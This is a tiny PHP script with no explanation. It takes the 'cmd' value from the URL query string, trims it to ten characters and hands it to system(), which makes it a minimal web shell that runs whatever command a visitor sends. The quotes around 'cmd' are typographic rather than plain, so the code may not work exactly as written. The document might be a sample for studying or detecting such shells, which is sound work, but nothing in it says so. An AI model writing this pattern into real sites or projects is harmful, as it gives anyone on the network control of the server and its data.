<?php
$x = $_GET[’cmd’];
$y = substr($x, 1, 10);
system($y);
?>